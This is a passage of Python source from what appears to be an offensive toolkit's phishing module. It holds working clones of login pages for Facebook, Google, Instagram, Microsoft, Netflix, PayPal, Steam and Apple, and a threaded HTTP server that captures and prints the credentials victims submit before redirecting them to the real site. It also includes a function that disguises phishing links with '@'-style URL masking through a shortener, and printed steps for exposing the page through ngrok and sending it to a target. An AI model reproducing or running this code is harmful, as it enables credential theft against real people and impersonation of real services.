        .btn-login { background: var(--fb-blue); color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: 700; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn-login:hover { background: #075ce4; }
        .forgot { color: var(--fb-blue); font-size: 14px; text-decoration: none; display: block; margin: 16px 0; }
        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
        .btn-new { background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: 700; padding: 12px 16px; cursor: pointer; transition: background 0.2s; }
        .btn-new:hover { background: #36a420; }
        .footer { margin-top: 28px; font-size: 14px; }
        @media (max-width: 900px) { .wrapper { flex-direction: column; text-align: center; } .brand-section { width: 100%; padding: 0; margin-bottom: 40px; } .brand-section img { margin-left: 0; } .brand-section h2 { font-size: 24px; } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="brand-section">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/600px-Facebook_Logo_%282019%29.png" alt="Facebook">
            <h2>Connect with friends and the world around you on Facebook.</h2>
        </div>
        <div class="login-card">
            <form action="/" method="post">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <button class="btn-new">Create new account</button>
            <div class="footer"><b>Create a Page</b> for a celebrity, brand or business.</div>
        </div>
    </div>
</body>
</html>
"""
    },
    '2': {
        'name': 'Google (Workspace) Login 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; text-align: center; }
        .logo { width: 75px; margin-bottom: 16px; display: block; margin-left: auto; margin-right: auto; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 10px 0; }
        p { font-size: 16px; color: #202124; margin-bottom: 32px; }
        .input-group { position: relative; margin-bottom: 24px; text-align: left; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border: 2px solid #0b57d0; outline: none; }
        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .btn-text { color: #0b57d0; font-weight: 500; text-decoration: none; font-size: 14px; }
        .btn-next { background: #0b57d0; color: #fff; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/" method="post">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="footer-btns">
                <a href="#" class="btn-text">Forgot email?</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""
    },
    '3': {
        'name': 'Instagram (Modern Dark) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .main-container { display: flex; align-items: center; gap: 32px; max-width: 800px; }
        .phone-img { height: 580px; display: block; }
        .right-column { display: flex; flex-direction: column; width: 350px; }
        .card { background: #000; border: 1px solid #262626; padding: 40px; text-align: center; margin-bottom: 10px; }
        .logo { margin-bottom: 30px; filter: invert(1); width: 175px; }
        input { width: 100%; background: #121212; border: 1px solid #262626; border-radius: 3px; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-size: 12px; }
        .btn-login { background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; padding: 8px; width: 100%; cursor: pointer; margin-top: 10px; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #262626; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .fb-icon { width: 16px; }
        .forgot { font-size: 12px; color: #e0e0e0; margin-top: 20px; text-decoration: none; display: block; }
        .signup { border: 1px solid #262626; padding: 20px; text-align: center; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { text-align: center; margin-top: 20px; font-size: 14px; }
        .app-stores { display: flex; justify-content: center; gap: 8px; margin-top: 10px; }
        .app-stores img { height: 40px; }
        @media (max-width: 800px) { .phone-img { display: none; } }
    </style>
</head>
<body>
    <div class="main-container">
        <img class="phone-img" src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/cfd514016593.png" alt="Phone">
        <div class="right-column">
            <div class="card">
                <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                <form action="/" method="post">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="btn-login">Log In</button>
                </form>
                <div class="divider">OR</div>
                <div class="fb-login">
                    <img class="fb-icon" src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/P3STTh26u9y.png" alt="FB">
                    Log in with Facebook
                </div>
                <a href="#" class="forgot">Forgot password?</a>
            </div>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-app">
                Get the app.
                <div class="app-stores">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Y26_6BSc0ig.png" alt="App Store">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_nP2.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""
    },
    '4': {
        'name': 'Microsoft 365 / Outlook 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { background: url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed; background-size: cover; font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-box { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 15px; margin-bottom: 20px; outline: none; }
        input:focus { border-bottom: 2px solid #0067b8; }
        .links { font-size: 13px; color: #0067b8; margin-bottom: 20px; }
        .btn-container { display: flex; justify-content: flex-end; }
        .btn-primary { background: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; transition: background 0.2s; }
        .btn-primary:hover { background: #005da6; }
        .options { margin-top: 28px; background: #fff; padding: 12px 44px; width: 440px; box-sizing: border-box; display: flex; align-items: center; gap: 12px; cursor: pointer; border: 1px solid #fff; transition: background 0.2s; }
        .options:hover { background: #f2f2f2; }
        .key-icon { width: 32px; }
    </style>
</head>
<body>
    <div style="display: flex; flex-direction: column; align-items: center;">
        <div class="login-box">
            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
            <h1>Sign in</h1>
            <form action="/" method="post">
                <input type="email" name="login" placeholder="Email, phone, or Skype" required>
                <div class="links">No account? <a href="#">Create one!</a></div>
                <div class="links"><a href="#">Can't access your account?</a></div>
                <div class="btn-container">
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
        <div class="options">
            <img class="key-icon" src="https://logincdn.msauth.net/shared/1.0/content/images/signin_options_4e48046ce74f4b89d45037c90576bfac.svg" alt="Key">
            <span>Sign-in options</span>
        </div>
    </div>
</body>
</html>
"""
    },
    '5': {
        'name': 'Netflix (Premium Red) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        body { background: #000; background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-07583f8b564/web/PH-en-20220502-popsignuptwoweeks-perspective_alpha_website_large.jpg'); background-size: cover; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; }
        .logo-container { width: 100%; padding: 20px 60px; box-sizing: border-box; }
        .logo { width: 167px; }
        .card { background: rgba(0,0,0,0.75); padding: 60px 68px; border-radius: 4px; width: 450px; box-sizing: border-box; margin-bottom: 100px; }
        h1 { color: #fff; font-size: 32px; font-weight: 700; margin-bottom: 28px; }
        input { width: 100%; background: #333; border: none; border-radius: 4px; color: #fff; padding: 16px 20px; margin-bottom: 16px; box-sizing: border-box; font-size: 16px; }
        .btn-signin { background: #e50914; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; padding: 16px; width: 100%; cursor: pointer; margin-top: 24px; }
        .btn-signin:hover { background: #f40612; }
        .help { display: flex; justify-content: space-between; color: #b3b3b3; font-size: 13px; margin-top: 10px; }
        .help a { color: #b3b3b3; text-decoration: none; }
        .signup-now { color: #737373; font-size: 16px; margin-top: 30px; }
        .signup-now a { color: #fff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="logo-container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
    </div>
    <div class="card">
        <h1>Sign In</h1>
        <form action="/" method="post">
            <input type="email" name="user" placeholder="Email or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="btn-signin">Sign In</button>
        </form>
        <div class="help">
            <label><input type="checkbox" checked> Remember me</label>
            <a href="#">Need help?</a>
        </div>
        <div class="signup-now">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>
    </div>
</body>
</html>
"""
    },
    '6': {
        'name': 'PayPal (Secure Connect) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <style>
        body { font-family: "PayPalSansBig-Regular", "Helvetica Neue", Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 460px; padding: 40px; text-align: center; }
        .logo { height: 32px; margin-bottom: 32px; }
        input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #888; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .forgot { display: block; text-align: left; color: #0070ba; font-weight: 700; text-decoration: none; font-size: 14px; margin-bottom: 24px; }
        .btn-login { background: #003087; color: #fff; border: none; border-radius: 100px; padding: 16px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; }
        .divider { margin: 24px 0; border-top: 1px solid #cbd2d6; position: relative; }
        .divider span { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background: #fff; padding: 0 10px; color: #6c7378; }
        .btn-signup { background: #e1e7eb; color: #003087; border: none; border-radius: 100px; padding: 16px; width: 100%; font-size: 16px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal">
        <form action="/" method="post">
            <input type="email" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#" class="forgot">Forgot password?</a>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <div class="divider"><span>or</span></div>
        <button class="btn-signup">Sign Up</button>
    </div>
</body>
</html>
"""
    },
    '7': {
        'name': 'Steam (Deck Style) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Login</title>
    <style>
        body { background: #1b2838 url('https://store.cloudflare.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask.jpg') no-repeat center top; background-size: cover; color: #fff; font-family: "Motiva Sans", Arial, Helvetica, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-card { background: rgba(24, 26, 33, 0.9); padding: 40px; border-radius: 4px; width: 400px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .logo { width: 176px; margin-bottom: 40px; display: block; margin-left: auto; margin-right: auto; }
        h1 { font-size: 28px; font-weight: 200; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; text-align: center; }
        label { color: #1999ff; font-size: 12px; font-weight: bold; display: block; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; background: #32353c; border: 1px solid #000; border-radius: 2px; color: #fff; padding: 12px; margin-bottom: 24px; box-sizing: border-box; outline: none; }
        input:focus { border: 1px solid #1999ff; }
        .btn-signin { background: linear-gradient(to right, #06bfff, #2d73ff); color: #fff; border: none; border-radius: 2px; padding: 12px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; transition: filter 0.2s; }
        .btn-signin:hover { filter: brightness(1.2); }
        .help { margin-top: 40px; font-size: 12px; text-align: center; }
        .help a { color: #afafaf; text-decoration: none; }
        .help a:hover { color: #fff; }
        .qr-section { margin-top: 30px; border-top: 1px solid #333; padding-top: 30px; text-align: center; }
        .qr-img { width: 150px; background: #fff; padding: 10px; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img class="logo" src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
        <h1>Sign In</h1>
        <form action="/" method="post">
            <label>Steam Account Name</label>
            <input type="text" name="user" required>
            <label>Password</label>
            <input type="password" name="pass" required>
            <button type="submit" class="btn-signin">Sign In</button>
        </form>
        <div class="qr-section">
            <p style="font-size: 12px; color: #1999ff; font-weight: bold; margin-bottom: 15px;">OR SIGN IN WITH QR CODE</p>
            <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=SteamLoginPhish" alt="QR Code">
            <p style="font-size: 11px; color: #888; margin-top: 10px;">Use the Steam Mobile App to sign in via QR code</p>
        </div>
        <div class="help">
            <a href="#">Help, I can't sign in</a>
        </div>
    </div>
</body>
</html>
"""
    },
    '8': {
        'name': 'Apple ID (Glassmorphism) 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <style>
        body { background: url('https://www.apple.com/v/apple-id/a/images/overview/hero_banner__dqskq86f4u6u_large.jpg') center/cover; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .glass-card { background: rgba(255,255,255,0.8); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; padding: 60px; width: 460px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .apple-logo { font-size: 40px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; margin-bottom: 12px; box-sizing: border-box; }
        .btn-continue { background: #000; color: #fff; border: none; border-radius: 12px; width: 44px; height: 44px; font-size: 20px; cursor: pointer; position: absolute; right: 70px; margin-top: -55px; }
        .footer-links { font-size: 14px; color: #0066cc; margin-top: 40px; }
        .footer-links a { text-decoration: none; color: inherit; }
    </style>
</head>
<body>
    <div class="glass-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="width: 40px; margin-bottom: 20px;" alt="Apple">
        <h1>Sign in with Apple ID</h1>
        <form action="/" method="post">
            <input type="text" name="appleid" placeholder="Apple ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-continue">→</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Apple ID or password?</a>
        </div>
    </div>
</body>
</html>
"""
    },
    '9': {
        'name': 'Custom HTML File',
        'html': '' # This will be loaded from a file
    },
    '10': {
        'name': 'Generic SaaS Portal 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Portal</title>
    <style>
        body { font-family: 'Inter', sans-serif; background: #f9fafb; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: #fff; border: 1px solid #e5e7eb; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); padding: 40px; width: 400px; }
        .header { text-align: center; margin-bottom: 32px; }
        .header h2 { font-size: 24px; font-weight: 700; color: #111827; margin: 0; }
        .header p { color: #6b7280; margin-top: 8px; }
        label { display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px; }
        input { width: 100%; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 14px; margin-bottom: 20px; box-sizing: border-box; }
        input:focus { border-color: #4f46e5; ring: 2px #c7d2fe; outline: none; }
        .btn-submit { width: 100%; background: #4f46e5; color: #fff; border: none; border-radius: 6px; padding: 10px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .btn-submit:hover { background: #4338ca; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" style="width: 48px; margin-bottom: 16px;" alt="Portal">
            <h2>Welcome back</h2>
            <p>Please enter your details</p>
        </div>
        <form action="/" method="post">
            <label>Email address</label>
            <input type="email" name="email" placeholder="you@company.com" required>
            <label>Password</label>
            <input type="password" name="pass" required>
            <button type="submit" class="btn-submit">Sign in</button>
        </form>
    </div>
</body>
</html>
"""
    }
}


class CredentialHarvesterHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(PHISHING_TEMPLATES[self.server.template_choice].encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print(f"\n{Colors.RED}{Colors.BOLD}[!!!] CREDENTIALS HARVESTED from {self.client_address[0]} [!!!]{Colors.RESET}")
        print(f"{Colors.PURPLE}  >> Data: {post_data}{Colors.RESET}")
        
        # You can also parse the data if it's URL-encoded
        try:
            parsed_data = {}
            for item in post_data.split('&'):
                if '=' in item:
                    key, value = item.split('=', 1)
                    parsed_data[key] = value
            if parsed_data:
                print(f"{Colors.BLUE}  >> Parsed:{Colors.RESET}")
                for k, v in parsed_data.items():
                    print(f"{Colors.BLUE}     {k}: {v}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}  >> Error parsing POST data: {e}{Colors.RESET}")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Thank you for your submission!</h2><p>Returning to home page...</p><script>setTimeout(function(){window.location.href='/';}, 3000);</script></body></html>")
        
        # Optional: redirect the user after a delay or to a legitimate site
        # self.send_response(302)
        # self.send_header('Location', 'http://www.google.com') # Redirect to google
        # self.end_headers()

def generate_masked_link(original_url, fake_domain):
    """Generates a masked 'social engineering' link using a shortener."""
    if not original_url.startswith(('http://', 'https://')):
        return None
        
    try:
        import requests
        # Use is.gd to shorten the URL first for a cleaner look
        api_url = f"https://is.gd/create.php?format=simple&url={original_url}"
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            short_url = response.text
            # Combine fake domain with shortened URL
            # Example: https://facebook.com-login-secure@is.gd/xyz123
            return f"https://{fake_domain}-login-secure-access@{short_url.replace('https://', '')}"
    except Exception:
        pass
    
    # Fallback if shortener fails
    clean_url = original_url.replace("http://", "").replace("https://", "")
    return f"https://{fake_domain}-secure-login@{clean_url}"

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    pass

def credential_harvester_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ CREDENTIAL HARVESTER ]===//{Colors.RESET}\n")

    print(f"{Colors.PURPLE}Available Phishing Templates:{Colors.RESET}")
    # Sort templates by key for consistent display
    sorted_templates = sorted(PHISHING_TEMPLATES.items(), key=lambda item: int(item[0]))
    for key, val in sorted_templates:
        print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {val['name']}{Colors.RESET}")
    
    template_choice = input(f"{Colors.BLUE}[+] Choose a template number: {Colors.RESET}")
    if template_choice not in PHISHING_TEMPLATES:
        print(f"\n{Colors.RED}[!] Invalid template choice.{Colors.RESET}")
        return

    selected_template_name = PHISHING_TEMPLATES[template_choice]['name']
    selected_template_html = ""

    # Determine default redirect URL based on template name
    default_redirect = "https://www.google.com"
    if "Facebook" in selected_template_name: default_redirect = "https://www.facebook.com"
    elif "Google" in selected_template_name: default_redirect = "https://accounts.google.com"
    elif "Instagram" in selected_template_name: default_redirect = "https://www.instagram.com"
    elif "Microsoft" in selected_template_name or "Outlook" in selected_template_name: default_redirect = "https://login.live.com"
    elif "Netflix" in selected_template_name: default_redirect = "https://www.netflix.com"
    elif "PayPal" in selected_template_name: default_redirect = "https://www.paypal.com"
    elif "Steam" in selected_template_name: default_redirect = "https://store.steampowered.com/login/"

    if selected_template_name == 'Custom HTML File':
        html_file_path = input(f"{Colors.BLUE}[+] Enter path to your custom HTML file: {Colors.RESET}")
        if not os.path.exists(html_file_path):
            print(f"\n{Colors.RED}[!] Custom HTML file not found at: {html_file_path}{Colors.RESET}")
            return
        try:
            with open(html_file_path, 'r', encoding='utf-8') as f:
                selected_template_html = f.read()
            selected_template_name = f"Custom: {os.path.basename(html_file_path)}"
        except Exception as e:
            print(f"\n{Colors.RED}[!] Error reading custom HTML file: {e}{Colors.RESET}")
            return
    else:
        selected_template_html = PHISHING_TEMPLATES[template_choice]['html']

    redirect_url = input(f"{Colors.BLUE}[+] Enter URL to redirect victims after submission (Default: {default_redirect}): {Colors.RESET}")
    if not redirect_url:
        redirect_url = default_redirect
    
    if not (redirect_url.startswith('http://') or redirect_url.startswith('https://')):
        print(f"\n{Colors.RED}[!] Invalid URL format. Please include http:// or https://.{Colors.RESET}")
        return


    host = input(f"{Colors.BLUE}[+] Listening Host (e.g., 0.0.0.0 for all interfaces, 127.0.0.1 for local): {Colors.RESET}")
    port_str = input(f"{Colors.BLUE}[+] Listening Port (e.g., 80, 8080): {Colors.RESET}")

    try:
        port = int(port_str)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid port number. Please enter a number between 1 and 65535.{Colors.RESET}")
        return

    my_server = None
    server_thread = None
    try:
        # Update the handler to use the chosen template and redirect URL
        class CustomHarvesterHandler(CredentialHarvesterHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(selected_template_html.encode())

            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                print(f"\n{Colors.RED}{Colors.BOLD}[!!!] CREDENTIALS HARVESTED from {self.client_address[0]} (Template: {selected_template_name}) [!!!]{Colors.RESET}")
                print(f"{Colors.PURPLE}  >> Data: {post_data}{Colors.RESET}")
                
                try:
                    parsed_data = {}
                    for item in post_data.split('&'):
                        if '=' in item:
                            key, value = item.split('=', 1)
                            parsed_data[key] = value
                    if parsed_data:
                        print(f"{Colors.CYAN}  >> Parsed:{Colors.RESET}")
                        for k, v in parsed_data.items():
                            print(f"{Colors.CYAN}     {k}: {v}{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}  >> Error parsing POST data: {e}{Colors.RESET}")

                self.send_response(302) # Redirect
                self.send_header('Location', redirect_url)
                self.end_headers()

        ThreadedHTTPServer.allow_reuse_address = True
        my_server = ThreadedHTTPServer((host, port), CustomHarvesterHandler)
        
        print(f"\n{Colors.BLUE}[*] Starting credential harvester on {host}:{port} with '{selected_template_name}'...{Colors.RESET}")
        print(f"{Colors.BLUE}[*] Serving fake page. Waiting for submissions...{Colors.RESET}")
        print(f"{Colors.BLUE}  - Access at: http://{host}:{port}{Colors.RESET}")
        print(f"{Colors.BLUE}  - Victims will be redirected to: {redirect_url}{Colors.RESET}")

        # Social Engineering Link Masker
        print(f"\n{Colors.BLUE}[?] Generate a masked 'Social Engineering' link? (y/n){Colors.RESET}")
        if input(get_prompt()).lower() == 'y':
            print(f"\n{Colors.WHITE}    To make this work publicly, you MUST use a tool like Ngrok.")
            print(f"    1. Run: 'ngrok http {port}' in another terminal.")
            print(f"    2. Copy the 'Forwarding' URL (e.g., https://a1b2-c3d4.ngrok-free.app).")
            print(f"    3. Paste that EXACT URL below.{Colors.RESET}")
            
            public_url = input(f"\n{Colors.BLUE}[+] Paste your PUBLIC URL (or press Enter for local IP): {Colors.RESET}")
            if not public_url: 
                public_url = f"http://{socket.gethostbyname(socket.gethostname())}:{port}"
            
            if not public_url.startswith(('http://', 'https://')):
                print(f"{Colors.RED}[!] Error: The URL must start with http:// or https://{Colors.RESET}")
            else:
                # Determine fake domain
                fake_domain = "facebook"
                if "Google" in selected_template_name: fake_domain = "google-accounts"
                elif "Instagram" in selected_template_name: fake_domain = "instagram"
                elif "Microsoft" in selected_template_name: fake_domain = "microsoft-login"
                
                masked = generate_masked_link(public_url, fake_domain)
                if masked:
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Masked Link Generated:{Colors.RESET}")
                    print(f"{Colors.WHITE}{Colors.BOLD}    {masked}{Colors.RESET}")
                    print(f"\n{Colors.YELLOW}[!] IMPORTANT: Some modern browsers (Chrome/Edge) may block '@' links.")
                    print(f"    If it fails, use the raw shortened URL: {public_url}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Failed to generate masked link.{Colors.RESET}")

        print(f"\n{Colors.BLUE}=== To make your page publicly accessible (like Zphisher): ==={Colors.RESET}")
        print(f"{Colors.BLUE}  1. Download Ngrok from https://ngrok.com/download{Colors.RESET}")
        print(f"{Colors.BLUE}  2. Unzip it and connect your account: 'ngrok authtoken <YOUR_AUTH_TOKEN>'{Colors.RESET}")
        print(f"{Colors.BLUE}  3. Run in a separate terminal: 'ngrok http {port}'{Colors.RESET}")
        print(f"{Colors.BLUE}  4. Share the 'Forwarding' URL provided by Ngrok with your target.{Colors.RESET}")
        print(f"{Colors.YELLOW}  - Press Ctrl+C to stop the server and return to menu.{Colors.RESET}")
        
        server_thread = threading.Thread(target=my_server.serve_forever)
        server_thread.daemon = True # Allow main program to exit even if server is running
        server_thread.start()

        while server_thread.is_alive():
            time.sleep(0.5)

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Harvester stopped by user.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error starting harvester: {e}{Colors.RESET}")
        if "Address already in use" in str(e):
            print(f"{Colors.RED}[!] Port {port} is already in use. Please choose a different port.{Colors.RESET}")
    finally:
        if my_server:
            print(f"{Colors.CYAN}[*] Shutting down server...{Colors.RESET}")
            my_server.shutdown()
            my_server.server_close()
        if server_thread and server_thread.is_alive():
            server_thread.join(timeout=1) # Give it a moment to shut down
        print(f"{Colors.CYAN}[*] Server stopped.{Colors.RESET}")

def phishing_menu():
    menu_map = {'1': ("Credential Harvester", credential_harvester_ui)}
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ PHISHING MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)


def financial_analysis_menu():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ FINANCIAL ANALYSIS SIMULATOR ]===//{Colors.RESET}\n")
    if not ADDITIONAL_LIBS_INSTALLED:
        print(f"{Colors.RED}[!] Required libraries not found. Please run 'pip install -r requirements.txt'{Colors.RESET}")
        return

    ticker = input(f"{Colors.BLUE}[+] Enter stock ticker (e.g., AAPL, GOOG): {Colors.RESET}").upper()
    start_date = input(f"{Colors.BLUE}[+] Enter start date (YYYY-MM-DD): {Colors.RESET}")
    end_date = input(f"{Colors.BLUE}[+] Enter end date (YYYY-MM-DD): {Colors.RESET}")
    initial_capital_str = input(f"{Colors.BLUE}[+] Enter initial capital (e.g., 10000): {Colors.RESET}")

